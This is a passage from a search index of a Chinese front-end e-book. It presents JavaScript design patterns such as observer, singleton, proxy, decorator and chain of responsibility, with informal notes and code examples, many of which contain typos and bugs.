cy.visit('/');\n    cy.contains('h1', 'Welcome to MrAn\\'s page');\n  });\n});\n</code></pre> <p>\u4e0d\u9700\u8981\u77e5\u9053\u5177\u4f53\u7684\u7ec4\u4ef6\uff0c\u5173\u6ce8\u754c\u9762\u52a0\u8f7d\u540e\u663e\u793a\u7684\u5185\u5bb9</p> <p>\u53ef\u80fd\u53ea\u76d1\u63a7\u6838\u5fc3\u4e1a\u52a1\u754c\u9762\uff08\u767b\u5f55\uff0c\u8d2d\u7269\u8f66\u7b49\uff09</p> <p>\u770b\u4e00\u4e9b\u7ecf\u5178\u7684\u5e93\u5982\u4f55\u5b9e\u73b0\u529f\u80fd\uff0c\u5982\u4f55\u90e8\u7f72\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u63d0\u9ad8\u81ea\u5df1</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","title":"12-4 JS\u8bbe\u8ba1\u6a21\u5f0f","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 14524  \u9605\u8bfb30\u5206\u949f</p> <p>\u7b80\u5355\u4ecb\u7ecd\u8bbe\u8ba1\u6a21\u5f0f\u7684\u5b9a\u4e49\u548c\u4f7f\u7528\u3002\u8bbe\u8ba1\u6a21\u5f0f\u9700\u8981\u4e30\u5bcc\u7684\u7ecf\u9a8c\u540e\u624d\u80fd\u719f\u7ec3\u4f7f\u7528\u3002\u5404\u79cd\u65b9\u5f0f\u90fd\u53ef\u4ee5\u5b9e\u73b0\u529f\u80fd\uff0c\u8bbe\u8ba1\u6a21\u5f0f\u5b9e\u73b0\u66f4\u4f18\u96c5\uff0c\u66f4\u52a0\u5bb9\u6613\u9605\u8bfb\u3002</p> <p>\u8bbe\u8ba1\u6a21\u5f0f\uff1a\u4e00\u5957\u53cd\u590d\u4f7f\u7528\uff0c\u7ecf\u8fc7\u5206\u7c7b\uff0c\u4ee3\u7801\u8bbe\u8ba1\u7ecf\u9a8c\u7684\u603b\u7ed3\u3002</p> <p>\u4e0b\u9762\u662f\u4e3b\u8981\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff1a</p> <p>\u8ba2\u9605\u53d1\u5e03\u6a21\u5f0f\uff08\u89c2\u5bdf\u8005\u6a21\u5f0f\uff09\u3001\u5355\u4f8b\u6a21\u5f0f\u3001\u7b56\u7565\u6a21\u5f0f\u3001\u4ee3\u7406\u6a21\u5f0f\u3001\u4e2d\u4ecb\u8005\u6a21\u5f0f\u3001\u88c5\u9970\u5668\u6a21\u5f0f\u3001\u5916\u89c2\u6a21\u5f0f\u3001\u5de5\u5382\u6a21\u5f0f\u3001\u5efa\u9020\u8005\u6a21\u5f0f\u3001\u8fed\u4ee3\u5668\u6a21\u5f0f\u3001\u4eab\u5143\u6a21\u5f0f\u3001\u804c\u8d23\u94fe\u6a21\u5f0f\u3001\u9002\u914d\u5668\u6a21\u5f0f\u3001\u6a21\u677f\u65b9\u6cd5\u6a21\u5f0f\u3001\u5907\u5fd8\u5f55\u6a21\u5f0f\u3002</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#-","title":"\u8ba2\u9605\u53d1\u5e03\u6a21\u5f0f-\u89c2\u5bdf\u8005\u6a21\u5f0f","text":"<p>\u539f\u4ee3\u7801\uff1a\u591a\u4e2a\u7ec4\u4ef6\u4e92\u76f8\u901a\u4fe1\uff0c\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u6df7\u6742\uff0c\u7ec4\u4ef6\u8026\u5408\u9ad8\u3002</p> <p>\u4fee\u6539\u540e\uff1a\u8ba2\u9605\u8005\u548c\u53d1\u5e03\u8005\u5206\u79bb\uff0c\u6709\u4e00\u4e2a\u5168\u5c40\u7684\u5bf9\u8c61\u5904\u7406\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>// \u5bf9\u8c61\nclass Event {\n  constructor() {\n    this.callbacks = {};\n  }\n  $on(name, fn) {\n    if (!this.callbacks[name]) {\n      this.callbacks[name] = [];\n    }\n    this.callbacks[name].push(fn);\n  }\n  $emit(name, arg) {\n    const callbacks = this.callbacks[name];\n    if (callbacks) {\n      callbacks.forEach(c =&gt; {\n        c.call(this, arg);\n      });\n    }\n  }\n  $off(name) {\n    this.callbacks[name] = null;\n  }\n}\n\n\n// \u4f7f\u7528\nlet event = new Event();\nevent.$on('event1', arg =&gt; {\n  console.log(arg);\n});\nevent.$emit('event1', 'test1');\nevent.$off('event1');\nevent.$emit('event1', 'test2');\n</code></pre> <p>\u4e0b\u9762\u662f VUE \u4e2d\u4e8b\u4ef6\u8ba2\u9605\u7684\u903b\u8f91(\u770b\u4e0d\u61c2)</p> <pre><code>export fucntion eventMixin (Vue: Class&lt;Component&gt;) {\n  const hookRE = /^hook:/\n  Vue.prototype.$on = function (event: string | Array&lt;string&gt;, fn: Function): Component {\n    const vm: Component = this;\n    if (Array.isArray(event)) {\n      for (let i = 0, l = event.length; i &lt; l; i++) {\n        vm.$on(event[i], fn);\n      }\n    } else {\n      (vm._events[event] || (vm._events[event] = [])).push(fn)\n      if (hookRE.test(event)) {\n        vm._hasHookEvent = true;\n      }\n    }\n    return vm;\n  }\n  // Vue.prototype.$once\n  Vue.prototype.$emit = function (event: string): Component {\n    const vm: Component = this;\n    let cbs = vm._events[event]\n    if (cbs) {\n      cbs = cbs.length &gt; 1 ? toArray(cbs) : cbs;\n      const args = toArray(cbs) : cbs\n      for (let i = 0, l = cbs.length; i &lt; l; i++) {\n        try {\n          cbs[i].apply(vm, args);\n        } catch (e) {\n          handleError(e, vm);\n        }\n      }\n    }\n    return vm;\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_1","title":"\u5355\u4f8b\u6a21\u5f0f","text":"<p>\u4fdd\u8bc1\u4e00\u4e2a\u7c7b\u4ec5\u6709\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5e76\u63d0\u4f9b\u5168\u5c40\u8bbf\u95ee\u70b9\u3002\u8c03\u7528\u8fd9\u4e2a\u7c7b\u65f6\uff0c\u5148\u5224\u65ad\u662f\u5426\u6709\u5b9e\u4f8b\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5148\u521b\u5efa\uff0c\u5982\u679c\u5b58\u5728\u76f4\u63a5\u8fd4\u56de\uff08\u4fdd\u8bc1\u5168\u5c40\u53ea\u6709\u8fd9\u4e00\u4e2a\u5b9e\u4f8b\uff09</p> <p>\u9002\u5e94\u4e8e\uff1a\u5bf9\u8bdd\u6846\uff08\u5168\u5c40\u70b9\u51fb\u591a\u6b21\uff0c\u4e5f\u662f\u8fd9\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff09\u5bf9\u8bdd\u6846\u521b\u5efa\u4e00\u6b21\u5373\u53ef\uff0c\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u7f13\u5b58\u5373\u53ef\u3002</p> <pre><code>function getSingle(fn) {\n  let result;\n  return function() {\n    return result || (result = fn.apply(this, arguemnts));\n  }\n}\n\nfunction createModalLayer() {\n  let div = document.createElement('div');\n  div.innerHTML = 'I am a modal';\n  div.className = 'modal';\n  div.style.display = 'none';\n  div.addEventListener('click', function() {\n    div.style.display = 'none';\n  }, false);\n  document.body.appendChild(div);\n  retunr div;\n}\n\n// \u4f7f\u7528\ncreateModalLayer = getSingle(createModalLayer);\ndocument.getElementById('modal-btn').addEventListener('click', () =&gt; {\n  const modalLayer = createModalLayer();\n  modalLayer.style.display = 'block';\n}, false);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_2","title":"\u7b56\u7565\u6a21\u5f0f","text":"<p>\u5b9a\u4e49\u4e00\u7cfb\u5217\u7684\u7b97\u6cd5\uff0c\u6bcf\u4e2a\u7b97\u6cd5\u5c01\u88c5\u8d77\u6765\uff0c\u7136\u540e\u53ef\u4ee5\u4e92\u76f8\u66ff\u6362\u3002\u5c06\u7b97\u6cd5\u5b9e\u73b0\u5206\u79bb\uff08utils\u51fd\u6570\uff09\uff0c\u4fbf\u4e8e\u4e0d\u540c\u5c0f\u7b97\u6cd5\u7684\u7ef4\u62a4\u3002</p> <p>\u4f8b\u5982\u79fb\u52a8\u7aef\u8ba1\u7b97\u754c\u9762\u6eda\u52a8\uff1a\u90a3\u4e48\u83b7\u53d6\u5f53\u524d\u79fb\u52a8\u7aef\u8fb9\u7f18\u7684\u5217\u662f\u4e00\u4e2a\u7b97\u6cd5\uff0c\u8ba1\u7b97\u9700\u8981\u663e\u793a\u7684\u5217\u662f\u53e6\u4e00\u4e2a\u7b97\u6cd5\u3002\u9ed8\u8ba4\u663e\u793a\u7684\u5217\u6570\u91cf\u4e5f\u662f\u4e00\u4e2a\u7b97\u6cd5\u3002</p> <pre><code>// \u8fd9\u90e8\u5206\u53ef\u4ee5\u653e\u5728\u914d\u7f6e\u6587\u4ef6json\u4e2d\uff0c\u7136\u540e\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\nconst policy = {\n  'a': (salary) =&gt; {\n    return salary * 4;\n  },\n  'b': (s) =&gt; s * 3,\n  'c': s =&gt; s * 2,\n};\n// \u8fd9\u6837\u5199\uff0c\u4fbf\u4e8e\u4ee3\u7801\u6269\u5c55\uff0c\u4e0d\u9700\u8981\u6539\u52a8\u4e0b\u9762\u7684\u51fd\u6570\n// \u76f4\u63a5\u6539\u53d8\u4e0a\u9762\u7684\u7b56\u7565\u5bf9\u8c61\u5373\u53ef\n\nfunction calculate1(level, salary) {\n  return policy[level] ? policy[level](salary) : null;\n}\n</code></pre> <p>\u8868\u5355\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u4f7f\u7528\u7b56\u7565\u6a21\u5f0f\u4f18\u5316</p> <pre><code>let form = {};\nform.submit = () =&gt; {\n  if (form.name.value === '' || form.password.value === '' || form.password.value.length &lt; 5) {\n    console.log('error');\n  }\n}\n</code></pre> <p>\u4f18\u5316\u540e</p> <pre><code>rules: {\n  name: [\n    { require: true, message: 'please input' },\n    { min: 3, max: 5, massage: 'please input 3 to 5 string' }\n  ],\n  date: [\n    { require: true }\n  ]\n};\n\n\nmethods: {\n  submit(name) {\n    this.$refs[name].validdate((valid) =&gt; {\n      if (valid) {\n        alert('submit');\n      } else {\n        alert('submit error');\n        return false;\n      }\n    });\n  },\n  reset(name) {\n    this.$refs[name].resetFields();\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_3","title":"\u4ee3\u7406\u6a21\u5f0f","text":"<p>\u901a\u8fc7\u4ee3\u7406\u7684\u5f62\u5f0f\uff0c\u8bbf\u95ee\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <p>\u539f\u56e0\uff1a\u5982\u679c\u4e00\u4e2a\u64cd\u4f5c\u5f00\u9500\u5f88\u5927\uff0c\u90a3\u4e48\u8bbe\u7f6e\u865a\u62df\u4ee3\u7406\u7684\u5f62\u5f0f\u5ef6\u8fdf\u8bbf\u95ee\u5bf9\u8c61\uff08\u4f7f\u7528\u865a\u62df\u4ee3\u7406\u5b9e\u73b0\u56fe\u7247\u61d2\u52a0\u8f7d\uff09</p> <pre><code>let imgFunc = (function() {\n  let imgNode = document.createElement('img');\n  document.body.appendChild(imgNode);\n  return {\n    setSrc: function(src) {\n      // imgNode.src = src \u6a21\u62df\u8017\u65f6\u7684\u64cd\u4f5c\n      setTimeout(() =&gt; {\n        imgNode.src = src;\n      }, 1000);\n    }\n  };\n})();\n\n// \u53ef\u4ee5\u6539\u6210\u4ee3\u7406\u6a21\u5f0f\nlet proxyImage = (function() {\n  let iimg = new Image();\n  img.onload = function() {\n    imgFunc.setSrc(this.src);\n  }\n  return {\n    setSrc(src) {\n      imgFunc.setSrc('loading.gif');\n      img.src = src;\n    }\n  };\n})();\n</code></pre> <p>\u51fd\u6570\u7684\u9632\u6296\u8282\u6d41\u7b49 </p> <p>\u6587\u4ef6\u7684\u5ef6\u8fdf\u4e0a\u4f20</p> <pre><code>var synchronousFile = function(id) {\n  // \u5f00\u59cb\u540c\u6b65\u6587\u4ef6 id\n}\n\nvar proxyFile = (function() {\n  let cache = [];\n  let timer;\n  return fucntion(id) {\n    cache.push(id);\n    if (timer) {\n      return;\n    }\n    timer = setTimeout(() =&gt; {\n      synchronousFile(cache.join(','));\n      clearTimerout(timer);\n      timer = null;\n      cache.length = 0;\n    }, 2000);\n  }\n})();\n\nvar checkbox = document.getElementByTagName('input');\nfor (let i = 0, c; c = checkbox[i]; i++) {\n  c.onclick = function() {\n    if (this.checked === true) {\n      proxyFile(this.id);\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_4","title":"\u4e2d\u4ecb\u8005\u6a21\u5f0f","text":"<p>\u901a\u8fc7\u4e00\u4e2a\u4e2d\u4ecb\u8005\u5bf9\u8c61\uff0c\u5176\u4ed6\u76f8\u5173\u5bf9\u8c61\u901a\u8fc7\u4e2d\u4ecb\u8005\u6765\u901a\u4fe1\uff0c\u800c\u4e0d\u662f\u4e92\u76f8\u5f15\u7528\u3002\u5f53\u4e00\u4e2a\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e2d\u4ecb\u8005\u5bf9\u8c61\u5373\u53ef\u3002\u4e2d\u4ecb\u8005\u72ec\u4eab\u53ef\u4ee5\u89e3\u8026\u3002</p> <p>\u4f8b\u5982\u5728\u884c\u5c55\u5f00\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5217\u90fd\u4f1a\u6539\u53d8\u884c\u6570\u636e\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u7edf\u4e00\u4e00\u4e2a\u884c\u4e2d\u4ecb\u8005\uff0c\u6765\u5904\u7406\u6bcf\u4e00\u4e2a\u6539\u52a8\u9020\u6210\u7684\u6570\u636e\u4fdd\u5b58\uff08\u4e0d\u9700\u8981\u6bcf\u4e00\u4e2a\u5355\u72ec\u4fdd\u5b58\u6570\u636e\uff09\u3002</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_5","title":"\u88c5\u9970\u5668\u6a21\u5f0f","text":"<p>\u4e0d\u6539\u53d8\u81ea\u8eab\u57fa\u7840\u4e0a\uff0c\u7ed9\u5bf9\u8c61\u52a8\u6001\u6dfb\u52a0\u65b9\u6cd5\uff08\u5e38\u89c1\u7684\u662f\u9ad8\u9636\u7ec4\u4ef6\uff0c\u7ed9\u539f\u59cb\u5bf9\u8c61\u6dfb\u52a0\u65b9\u6cd5\u7b49\uff09</p> <p>\u4f8b\u5982\u5728\u79fb\u52a8\u7aef\u754c\u9762\u4e2d\uff0c\u53ef\u4ee5\u90fd\u4f7f\u7528\u4e00\u4e2a\u7ec4\u4ef6\u5305\u88f9\u79fb\u52a8\u7aef\u7ec4\u4ef6\uff0c\u6765\u7edf\u4e00\u5904\u7406\u5b89\u5353\u8bbe\u5907\u7684\u8fd4\u56de\u64cd\u4f5c\u3002\u8fd9\u4e2a\u53ef\u4ee5\u8fdb\u884c\u4f18\u5316\u3002</p> <p>\u5305\u88f9\u5c42\u7684\u51fd\u6570\u4e0d\u80fd\u8986\u76d6\u539f\u59cb\u7684\u51fd\u6570\u3002\u5224\u65ad\u662f\u5426 Object assign \u64cd\u4f5c\u3002</p> <pre><code>import React from 'react';\nconst withLog = Component =&gt; {\n  class NewComponent extends React.Component {\n    componentWillMount() {\n      console.log('will mount');\n    }\n    componentDidMount() {\n      console.log('did mount');\n    }\n    render() {\n      return &lt;Component/&gt;;\n    }\n  }\n}\n</code></pre> <p>\u4e00\u4e2a\u590d\u6742\u7684\u4f8b\u5b50</p> <pre><code>export const connect = (mapStateToProps = state =&gt; state, mapDispatchToProps = {}) =&gt; (WrapComponent) =&gt; {\n  return class ConnectComponnet extends React.Component {\n    static contextTypes = {\n      store: PropTypes.object\n    };\n    constructor(props, context) {\n      super(props, context);\n      this.state = {\n        props: {}\n      };\n    }\n    componentDidMount() {\n      const { store } = this.context;\n      store.subscribe(() =&gt; this.update);\n      this.update;\n    }\n    update() {\n      const { store } = this.context;\n      const stateProps = mapStateToProps(store.getState());\n      const dispatchProps = bindActionCreators(mapDispatchToProps, store.dispatch);\n      this.setState({\n        props: {\n            ...this.state.props,\n          ...stateProps,\n          ...dispatchProps,\n        }\n      });\n    }\n\n    render() {\n      return &lt;WrapComponent {...this.state.props}/&gt;;\n    }\n  }\n}\n</code></pre> <p>\u5728 SSR \u4e2d\uff0c\u4f7f\u7528\u7684 Next \u51fd\u6570\u4e5f\u662f\u7c7b\u4f3c\u7684\u88c5\u9970\u5668\u6a21\u5f0f\u5b9e\u73b0\u7684</p> <pre><code>Function.prototype.before = function(fn) {\n  let _self = this;\n  // \u8fd4\u56de\u5305\u542b\u539f\u51fd\u6570\u548c\u65b0\u51fd\u6570\u7684\u201d\u4ee3\u7406\u51fd\u6570\u201c\n  return function() {\n    // \u6267\u884c\u65b0\u51fd\u6570\uff0c\u4fdd\u8bc1this\u4e0d\u88ab\u52ab\u6301\uff0c\u65b0\u51fd\u6570\u63a5\u53d7\u7684\u53c2\u6570\u4e5f\u4f1a\u4f20\u5165\u539f\u51fd\u6570\uff0c\u65b0\u51fd\u6570\u5148\u6267\u884c\n    fn.apply(this, arguments);\n    // \u6267\u884c\u539f\u51fd\u6570\uff0c\u4fdd\u8bc1this\u4e0d\u88ab\u52ab\u6301\uff0c\u5e76\u8fd4\u56de\u539f\u51fd\u6570\u7684\u6267\u884c\u7ed3\u679c\n    let response = _self.apply(this, arguemnts);\n    return response;\n  }\n};\n\nFunction.prototype.after = function(fn) {\n  let _self = this;\n  return function() {\n    var ret = _self.apply(this, arguments);\n    fn.apply(this, arguments);\n    return ret;\n  }\n};\n</code></pre> <p>\u4ee3\u7406\u6a21\u5f0f\u548c\u88c5\u9970\u5668\u6a21\u5f0f\u57fa\u672c\u76f8\u4f3c\uff0c\u4fdd\u7559\u4e86\u5bf9\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u5e76\u4e14\u5411\u90a3\u4e2a\u5bf9\u8c61\u53d1\u9001\u8bf7\u6c42\u3002\u4ee3\u7406\u6a21\u5f0f\u7684\u76ee\u7684\uff1a\u672c\u4f53\u8bbf\u95ee\u4e0d\u65b9\u4fbf\u3002\u88c5\u9970\u5668\u6a21\u5f0f\uff1a\u4e3a\u672c\u4f53\u52a8\u6001\u52a0\u5165\u884c\u4e3a\u3002</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_6","title":"\u5916\u89c2\u6a21\u5f0f","text":"<p>\u591a\u4e2a\u65b9\u6cd5\u4e00\u8d77\u88ab\u8c03\u7528\uff08\u9002\u5e94\u4e8e\u517c\u5bb9\u6027\u4ee3\u7801\uff09\uff0c\u5916\u90e8\u66b4\u9732\u4e00\u4e2aAPI\uff0c\u5185\u90e8\u5904\u7406\u5404\u79cd\u517c\u5bb9\u6027\u95ee\u9898\u3002\u6216\u8005\u5c01\u88c5\u7ec4\u4ef6\u65f6\uff08\u5185\u90e8\u5b9e\u73b0\u5177\u4f53\u7684\u903b\u8f91\uff0c\u5916\u90e8\u66b4\u9732props\u4f20\u53c2\uff09</p> <pre><code>addEvent(dom, type, fn) {\n  if (dom.addEventListener) {\n    dom.addEventListener(type, fn, false);\n  }\n  else if (dom.attachEvent) {\n    dom.attachEvent('on' + type, fn);\n  }\n  else {\n    dom['on' + type] = fn;\n  }\n}\n\nstopEvent(e) {\n  // preventDefault/stopPropagation/returnValue/cancelBubble\n  // \u517c\u5bb9\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\uff0c\u5224\u65ad\u51fd\u6570\u5b58\u5728\u540e\u518d\u6267\u884c\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_7","title":"\u5de5\u5382\u6a21\u5f0f","text":"<p>\u5f39\u7a97\u3001\u901a\u77e5\u7b49\uff0c\u5916\u90e8\u66b4\u9732\u4e00\u4e2aAPI\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u5b9e\u4f8b</p> <pre><code>const Notification = function(options) {\n  if (Vue.prototype.$isServer) {\n    return;\n  }\n  options = options || {};\n  const userOnClose = options.onClose;\n  const id = 'notification_' + seed++;\n  const position = options.position || 'top-right';\n\n  options.onClose = function() {\n    Notifacation.close(id, userOnClose);\n  };\n\n  instance = new NotificationConstructor({\n    data: options\n  });\n\n  if (isVNode(options.message)) {\n    instance.$slots.default = [options.message];\n    options.message = '123';\n  }\n  instance.id = id;\n  instance.$mount();\n  document.body.appendChild(instance.$el);\n  instance.visible = true;\n  instance.dom = instance.$el;\n  instance.dom.style.zIndex = PopupManager.nextZindex();\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_8","title":"\u5efa\u9020\u8005\u6a21\u5f0f","text":"<p>Builder \u521b\u5efa\u76f8\u5bf9\u66f4\u590d\u6742</p> <pre><code>var Person = function(name, work) {\n  var _person = new Human();\n  _person.name = new Named(name);\n  _person.work = new Work(work);\n  return _person;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_9","title":"\u8fed\u4ee3\u5668\u6a21\u5f0f","text":"<p>\u6570\u7ec4\u4e2d forEach map \u65b9\u6cd5\uff0c\u4e0d\u9700\u8981\u5173\u6ce8\u5185\u90e8\u6784\u9020\uff0c\u76f4\u63a5\u53ef\u4ee5\u8bbf\u95ee\u6bcf\u4e2a\u5143\u7d20\uff08\u628a\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8f6c\u6362\u6210\u7ebf\u6027\u7684\u6570\u636e\u7ed3\u6784\uff09</p> <pre><code>var each = (ary, callback) =&gt; {\n  for (let i = 0; i &lt; arg.length; i++) {\n    callback.call(ary[i], i, ary[i]);\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_10","title":"\u4eab\u5143\u6a21\u5f0f","text":"<p>\u628a\u4e00\u7cfb\u5217\u7684\u7ebf\u6027 if-else \u53d8\u6362\u6210\u5bf9\u8c61\u7684 key-value \u5f62\u5f0f\uff0c\u4fbf\u4e8e\u6269\u5c55\u3002</p> <pre><code>let Model = function(sex) {\n  this.sex = sex;\n}\nModel.prototype.takePhoto = function() {\n  console.log(this.sex + this.underwear);\n}\nlet maleModel = new Model('male');\nlet femaleModel = new Model('female');\nfor (let i = 1; i &lt;= 50; i++) {\n  maleModel.underwear = 'underware' + i;\n  maleModel.takePhoto();\n}\nfor (let j = 1; j &lt;= 50; j++) {\n  femaleModel.underwear = 'underware' + j;\n  femaleModel.takePhoto();\n}\n</code></pre> <p>\u8fd9\u91cc\u533a\u5206\u5185\u90e8\u72b6\u6001\u548c\u5916\u90e8\u72b6\u6001\u3002</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_11","title":"\u804c\u8d23\u94fe\u6a21\u5f0f","text":"<p>\u53c8\u79f0\u4e3a\u4e2d\u95f4\u4ef6\u673a\u5236\u3002\u628a\u8bf7\u6c42\u7684\u53d1\u8d77\u8005\u548c\u63a5\u53d7\u8005\u89e3\u8026\uff0c\u4e2d\u95f4\u7684\u90e8\u5206\u53ef\u4ee5\u5904\u7406\u8bf7\u6c42\u3002\u53ef\u4ee5\u6cbf\u7740\u804c\u8d23\u94fe\u4f20\u9012\u8bf7\u6c42\uff0c\u76f4\u5230\u6709\u4e00\u4e2a\u5bf9\u8c61\u5904\u7406\u3002\u7c7b\u4f3c\u4e8e\u4e2d\u95f4\u4ef6\u7684SSR\u5904\u7406\u673a\u5236\u3002</p> <pre><code>let order = (orderType, pay, stock) =&gt; {\n  if (orderType === 1) {\n    if (pay === true) {\n      console.log(1);\n    } else {\n      if (stock &gt; 0) {\n        console.log(2);\n      } else {\n        console.log(3);\n      }\n    }\n  } else if (orderType = 2) {\n    // \u5176\u4ed6\u7684\u60c5\u51b5\n  } else {\n    // \u5176\u4ed6\u7684\u60c5\u51b5\n  }\n}\n// \u8fd9\u6837\u590d\u6742\u7684 if-else \u5d4c\u5957\uff0c\u9020\u6210\u4ee3\u7801\u5c42\u7ea7\u5f88\u591a\uff0c\u53ef\u4ee5\u4f18\u5316\n</code></pre> <p>\u94fe\u5f0f\u5904\u7406</p> <pre><code>var order100 = (orderType, pay, stock) {\n  if (orderType === 1 &amp;&amp; pay === true) {\n    console.log(1);\n  } else {\n    console.log(2);\n  }\n}\n\nvar Chain = function(fn) {\n  this.fn = fn;\n  this.successor = null;\n}\n\nChain.prototype.setNextSuccessor = (successor) =&gt; {\n  return this.successor = successor;\n}\n\nChain.prototype.passRequest = () =&gt; {\n  let ret = this.fn.apply(this, arguments);\n  if (ret === 'nextSuccessor') {\n    return this.successor &amp;&amp; this.successor.passRequest.apply(this.successor, arguments);\n  }\n  return ret;\n};\n\nvar chainOrder500 = new Chain(order500);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_12","title":"\u9002\u914d\u5668\u6a21\u5f0f","text":"<p>\u5904\u7406\u4e0d\u540c\u7684\u63a5\u53e3\u7684\u9002\u914d\u5668</p> <p>\u4f8b\u5982\u8c37\u6b4c\u5730\u56fe\u548c\u767e\u5ea6\u5730\u56fe\u7684\u63a5\u53e3\u4e0d\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u8c03\u7528\u4e0d\u540c\u63a5\u53e3\uff0c\u9700\u8981\u5199\u4e00\u4e2a\u9002\u914d\u5668\uff0c\u5904\u7406\u4e0d\u7528\u7b2c\u4e09\u65b9\u5e93\u7684\u63a5\u53e3\u95ee\u9898\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528JSON\u4f20\u503c\u3002</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_13","title":"\u6a21\u677f\u65b9\u6cd5\u6a21\u5f0f","text":"<p>\u5728\u4e00\u4e2a\u65b9\u6cd5\u4e2d\uff0c\u5b9a\u4e49\u4e00\u4e2a\u9aa8\u67b6\uff08\u6a21\u677f\uff09\uff0c\u628a\u5177\u4f53\u7684\u5b9e\u73b0\u653e\u5728\u5b50\u7c7b\u4e2d\u3002\u597d\u5904\uff1a\u53ef\u4ee5\u4e0d\u6539\u53d8\u5916\u90e8\u6a21\u677f\u65b9\u6cd5\u7ed3\u6784\u7684\u60c5\u51b5\u4e0b\uff0c\u91cd\u65b0\u5b9a\u4e49\u7b97\u6cd5\u4e2d\u67d0\u4e9b\u6b65\u9aa4\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <p>vue slot \u548c react children</p> <pre><code>class Parent {\n  render () {\n    return (\n        &lt;div&gt;{this.props.children}&lt;/div&gt;\n    );\n  }\n}\n\nclass Stage {\n  render () {\n    return (\n      &lt;Parent&gt;\n        &lt;div&gt;this is child&lt;/div&gt;\n      &lt;/Parent&gt;\n    );\n  }\n}\n</code></pre> <p>\u5916\u90e8\u7236\u7ec4\u4ef6\u5b9e\u73b0\u6837\u5f0f\u6e32\u67d3\uff08\u56fa\u5b9a\u5185\u5bb9\uff09\uff0c\u5185\u90e8\u5b50\u7ec4\u4ef6\u5b9e\u73b0\u5185\u5bb9\u7f16\u8f91\uff08\u52a8\u6001\u7f16\u8f91\uff09</p> <pre><code>&lt;template&gt;\n    &lt;div&gt;\n    &lt;slot /&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;template&gt;\n    &lt;parent&gt;\n    &lt;div&gt;child&lt;/div&gt;\n  &lt;/parent&gt;\n&lt;/template&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_14","title":"\u5907\u5fd8\u5f55\u6a21\u5f0f","text":"<p>\u53ef\u4ee5\u6062\u590d\u5230\u5bf9\u8c61\u4e4b\u524d\u7684\u67d0\u4e2a\u72b6\u6001\uff08\u8bb0\u5f55\u7528\u6237\u64cd\u4f5c\u7684\u6570\u7ec4\uff0c\u652f\u6301\u64a4\u9500\u548c\u56de\u9000\uff09</p> <p>\u7b80\u5355\u7684\u5907\u5fd8\u5f55\u76f4\u63a5\u4f7f\u7528\u6570\u7ec4\u5b9e\u73b0</p> <p>\u590d\u6742\u7684\u5907\u5fd8\u5f55\u9700\u8981\u6839\u636e\u6bcf\u4e2a\u64cd\u4f5c\uff0c\u83b7\u53d6\u53cd\u5411\u64cd\u4f5c\u5e76\u6267\u884c</p>"},{"location":"ebook-kaikeba-frontend/03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/#_15","title":"\u603b\u7ed3","text":"<p>\u521b\u5efa\u8bbe\u8ba1\u6a21\u5f0f\uff1a\u5de5\u5382\u6a21\u5f0f\u3001\u5355\u4f8b\u6a21\u5f0f\u3001\u5efa\u9020\u8005\u3001\u539f\u578b</p> 